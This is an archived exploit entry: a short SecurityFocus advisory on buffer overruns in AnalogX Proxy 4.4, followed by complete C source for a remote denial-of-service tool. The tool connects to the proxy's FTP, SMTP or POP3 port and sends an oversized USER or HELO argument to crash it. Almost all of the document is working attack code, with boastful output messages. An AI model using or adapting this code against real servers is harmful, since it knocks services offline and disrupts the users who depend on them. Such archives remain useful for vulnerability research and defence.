source: http://www.securityfocus.com/bid/1504/info

AnalogX Proxy is a simple proxy server that allows a user to connect a network of computers to the internet through the proxy gateway. Many of the services provided contain buffer overrun vulnerabilities that can allow an attacker to crash the proxy server remotely. The FTP, SMTP, POP3 and SOCKS services are vulnerable to a denial of service attack by sending especially long arguments to certain commands. 

/*

 AnalogX Proxy DoS by wildcoyote@coders-pt.org

 Accoding to bugtraq advisory....
 Bugtraq id    : 1504
 Object        : Proxy.exe (exec) 
 Class         : Boundary Condition Error 
 Cve           : GENERIC-MAP-NOMATCH 
 Remote        : Yes 
 Local         : No 
 Published     : July 25, 2000 
 Vulnerable    : AnalogX Proxy 4.4
 Not vulnerable: AnalogX Proxy 4.6
                 AnalogX Proxy 4.5

 Words: Bastards, they killed kenny!

*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>


struct analogXDoS_types {
  char *service;
  int port;
  char *command;
  int overflow_string_size;
};

struct analogXDoS_types analogXDoS_types[]={
  {"AnalogX FTP Proxy ",21,"USER BO@userfriendly.org\n",370}, 
  {"AnalogX SMTP Proxy",25,"HELO BO@userfriendly.org\n",370},
  {"AnalogX POP3 Proxy",110,"USER BO@userfriendly.org\n",370},
  {NULL,0,NULL,0}
};



int
openhost(char *host,int port) {
   int sock;
   struct sockaddr_in addr;
   struct hostent *he;
   he=gethostbyname(host);
   if (he==NULL) return -1;
   sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
   if (sock==-1) return -1;
   memcpy(&addr.sin_addr, he->h_addr, he->h_length);
   addr.sin_family=AF_INET;
   addr.sin_port=htons(port);
   if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) sock=-1;
   return sock;
}

void
sends(int sock,char *buf) {
  write(sock,buf,strlen(buf));
}

void
analogXcrash(char *host, int type)
{
 char *buf;
 int sock, i, x, buffer_size;
 printf("Type Number: %d\n",type);
 printf("Service    : %s\n",analogXDoS_types[type].service);
 printf("Port       : %d\n",analogXDoS_types[type].port);
 printf("Let the show begin ladyes...\n");
 printf("Connecting to %s [%d]...",host,analogXDoS_types[type].port);
 sock=openhost(host,analogXDoS_types[type].port);
 if (sock==-1)
 {
  printf("FAILED!\n");
  printf("Couldnt connect...leaving :|\n\n");
  exit(-1);
 }
 printf("SUCCESS!\n");
 printf("Allocating memory for buffer...");
 buffer_size=(strlen(analogXDoS_types[type].command)
             +
             analogXDoS_types[type].overflow_string_size);
 if (!(buf=malloc(buffer_size)))
 {
  printf("FAILED!\n");
  printf("Leaving... :[\n\n");
  exit(-1);
 }
 printf("WORKED! (heh)\n");
 for(i=0;;i++)
  if ((analogXDoS_types[type].command[i]=='B') &&
      (analogXDoS_types[type].command[i+1]=='O')) break;
  else buf[i]=analogXDoS_types[type].command[i];
 for(x=0;x<analogXDoS_types[type].overflow_string_size;x++) strcat(buf,"X");
 i+=2;
 for(;i<strlen(analogXDoS_types[type].command);i++)
    buf[strlen(buf)]=analogXDoS_types[type].command[i];
 printf("Sending EVIL buffer ;)\n");
 sends(sock,buf);
 close(sock);
 printf("Heh...that host should be a gonner by now ;)\n");
 printf("Was it good for you to? :)\n\n");
}

void
show_types()
{
 int i;
 for(i=0;;i++)
 {
  if (analogXDoS_types[i].service==NULL) break;
  printf("Type Number: %d\nService : %s Port : %d Overflow string size : %d\n",i
        ,analogXDoS_types[i].service
        ,analogXDoS_types[i].port
        ,analogXDoS_types[i].overflow_string_size);
 }
}

main(int argc, char *argv[])
{
 int i;
 // lets keep on (int) var i the number of types ;)
 for(i=0;;i++) if (analogXDoS_types[i].service==NULL) break;
 i--; // oh my god, cant forget that'array[0] thingie! :))
 printf("\n\t\tAnalogX Proxy v4.4 DoS by wildcoyote@coders-pt.org\n\n");
 if (argc<3) {
    printf("Sintaxe: %s <host> <type number> [port]\n",argv[0]);
    show_types();
    printf("\n*Enjoy*...\n\n");
 }
 else if (atoi(argv[2])<=i)
       if (argc==3) analogXcrash(argv[1],atoi(argv[2]));
       else {
           analogXDoS_types[atoi(argv[2])].port=atoi(argv[3]);
           analogXcrash(argv[1],atoi(argv[2]));
       }
      else
      {
        printf("Invalid type value (max type=%d)\n",i);
        printf("Type %s for more information :)\n\n",argv[0]);
      }
}